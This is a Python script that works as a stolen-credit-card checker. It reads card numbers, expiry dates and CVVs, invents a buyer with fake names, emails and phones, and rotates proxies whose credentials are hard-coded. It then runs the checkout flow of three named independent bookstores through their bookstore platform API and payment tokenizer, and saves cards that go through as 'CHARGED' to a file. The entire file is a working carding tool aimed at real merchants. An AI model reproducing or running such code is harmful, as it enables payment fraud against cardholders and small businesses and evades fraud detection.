import asyncio
import aiohttp
import uuid
import json
from faker import Faker
import random
import time

# Lista de proxies rotativas
PROXIES = [
    "http://zldoydyq:savftkhk2uk1@38.153.152.244:9594",
    "http://zldoydyq:savftkhk2uk1@86.38.234.176:6630"
]

async def go(c):
    fake = Faker('en_US')

    pages = [
        {"name": "Turn The Page", "url": "https://turnthepagebookstore.ca", "id": "KD-jsArtsHLhFtASZDIU4Q", "sid": "1397330", "key": "pkapi_prod_pZs4FYgkxy2AfrTdyd", "cond": ""},
        {"name": "The Open Book", "url": "https://theopenbook.ca", "id": "UPeceejxZge0HAgFl26R3w", "sid": "31", "key": "pkapi_prod_eqPumviIwjZhd3wYwf", "cond": "R", "log": "/item/UPeceejxZge0HAgFl26R3w/lists/LYtzKTDKUojQ"},
        {"name": "Found Bookshop", "url": "https://www.foundbookshop.com", "id": "6nvBPLOyqFiSneZA79BPYw", "sid": "1338850", "key": "pkapi_prod_qwfAj8aM47aMa5TUCb", "cond": ""}
    ]

    page = random.choice(pages)

    h = {
        'Accept': '*/*',
        'Accept-Language': 'es-ES,es;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': page["url"],
        'Referer': page["url"] + '/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    h2 = {
        'Accept': '*/*',
        'Accept-Language': 'es-419,es;q=0.9',
        'Connection': 'keep-alive',
        'Origin': 'https://js.globalpay.com',
        'Referer': 'https://js.globalpay.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'content-type': 'application/json',
        'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    p = c.replace('/', '|').split('|')
    p = [part for part in p if part.strip()]

    if len(p) < 3:
        print("INVALID CARD")
        return

    n = p[0]
    isAmex = n.startswith('3')
    if not ((isAmex and len(n) == 15 and n.isdigit()) or (len(n) == 16 and n.isdigit())):
        print("INVALID CARD")
        return

    cvc = p[-1]
    if not ((isAmex and len(cvc) == 4 and cvc.isdigit()) or (len(cvc) == 3 and cvc.isdigit())):
        print("INVALID CARD")
        return

    dP = p[1:-1]
    if len(dP) == 1:
        expD = dP[0]
        if len(expD) == 4 and expD.isdigit():
            mm = expD[:2]
            y = expD[2:]
        else:
            print("INVALID CARD")
            return
    elif len(dP) == 2:
        mm = dP[0]
        y = dP[1]
    else:
        print("INVALID CARD")
        return

    mm = mm.zfill(2) if mm.isdigit() else "invalid"
    if not (mm.isdigit() and 1 <= int(mm) <= 12):
        print("INVALID CARD")
        return

    if y.isdigit():
        if len(y) == 2:
            y = f"20{y}"
        elif len(y) != 4:
            print("INVALID CARD")
            return
    else:
        print("INVALID CARD")
        return

    time.sleep(15)
    u = str(uuid.uuid4())
    nm = fake.name()
    em = fake.email(domain=fake.random_element(['gmail.com', 'outlook.com']))
    ph = f"({fake.random_element(['205', '305', '404', '503'])}) {fake.random_number(digits=3, fix_len=True)}-{fake.random_number(digits=4, fix_len=True)}"

    async with aiohttp.ClientSession() as sess:
        proxy = random.choice(PROXIES)  # Seleccionar un proxy aleatorio

        u1 = f"{page['url']}/item/{page['id']}"
        async with sess.get(u1, proxy=proxy) as r1:  # Usar proxy
            if r1.status != 200:
                print(f"Error in GET: {r1.status}")
                return

        log = page.get("log", f"/item/{page['id']}")
        d1 = {
            'uuid': u,
            'session_id': 'undefined',
            'log_url': log,
            'store_id': page["sid"],
        }
        u2 = "https://api.bookmanager.com/customer/session/get"
        async with sess.post(u2, data=d1, headers=h, proxy=proxy) as r2:  # Usar proxy
            if r2.status != 200:
                print(f"Error in POST getSession: {r2.status}")
                return
            s = json.loads(await r2.text())["session_id"]

        d2 = {
            'uuid': u,
            'session_id': s,
            'log_url': log,
            'store_id': page["sid"],
            'eisbn': page["id"],
            'condition': page["cond"],
            'quantity': '1',
        }
        u3 = "https://api.bookmanager.com/customer/cart/add"
        async with sess.post(u3, data=d2, headers=h, proxy=proxy) as r3:  # Usar proxy
            if r3.status != 200:
                print(f"Error in POST cart/add: {r3.status}")
                return

        d3 = {
            'uuid': u,
            'session_id': s,
            'log_url': '/checkout/cart',
            'store_id': page["sid"],
            'delivery_preference': 'pickup',
            'custom': 'false',
        }
        u4 = "https://api.bookmanager.com/customer/checkout/setDelivery"
        async with sess.post(u4, data=d3, headers=h, proxy=proxy) as r4:  # Usar proxy
            if r4.status != 200:
                print(f"Error in POST setDelivery: {r4.status}")
                return

        d4 = {
            'uuid': u,
            'session_id': s,
            'log_url': '/purchase',
            'store_id': page["sid"],
        }
        u5 = "https://api.bookmanager.com/customer/checkout/getPaymentChoices"
        async with sess.post(u5, data=d4, headers=h, proxy=proxy) as r5:  # Usar proxy
            if r5.status != 200:
                print(f"Error in POST getPaymentChoices: {r5.status}")
                return

        d5 = {
            'object': 'token',
            'token_type': 'supt',
            'card': {
                'number': n,
                'cvc': cvc,
                'exp_month': mm,
                'exp_year': y,
            },
        }
        u6 = f"https://api.heartlandportico.com/SecureSubmit.v1/api/token?api_key={page['key']}"
        async with sess.post(u6, json=d5, headers=h2, proxy=proxy) as r6:  # Usar proxy
            if r6.status != 201:
                print(f"Error in POST Heartland Token: {r6.status}")
                return
            t = json.loads(await r6.text())["token_value"]

        b = n[:6]
        l4 = n[-4:]
        cm = f"{b}******{l4}"
        ct = (
            "visa" if n.startswith("4") else
            "mastercard" if n.startswith("5") else
            "amex" if n.startswith("3") else
            "discover" if n.startswith("6") else "unknown"
        )
        d6 = {
            'uuid': u,
            'session_id': s,
            'log_url': '/purchase',
            'store_id': page["sid"],
            'custom': 'false',
            'delivery_preference': 'pickup',
            'preferred_communication': 'phone',
            'gift_cards': '[]',
            'payment_choice': 'global',
            'name': nm,
            'email': em,
            'phone': ph,
            'transaction_data': f'{{"details":{{"cardNumber":"{cm}","cardBin":"{b}","cardLast4":"{l4}","cardType":"{ct}","cardSecurityCode":true,"expiryMonth":"{mm}","expiryYear":"{y}","cardholderName":"{nm}"}},"paymentReference":"{t}"}}',
        }
        u7 = "https://api.bookmanager.com/customer/checkout/cardPayment"
        async with sess.post(u7, data=d6, headers=h, proxy=proxy) as r7:  # Usar proxy
            st = r7.status
            tx = await r7.text()
            if st == 200:
                try:
                    j = json.loads(tx)
                    if "error" in j:
                        print(f"{c} => DECLINED => RESPONSE: {j['error']}")
                    else:
                        print(f"{c} => CHARGED")
                        with open("charged.txt", "a") as f:
                            f.write(f"{c} - {tx}\n")
                except json.JSONDecodeError:
                    print(f"{c} => CHARGED")
                    with open("charged.txt", "a") as f:
                        f.write(f"{c} - {tx}\n")
            else:
                print(f"{c} => ERROR {st}")

while True:
    c = input("CC|EXP|CVV: ")
    asyncio.run(go(c))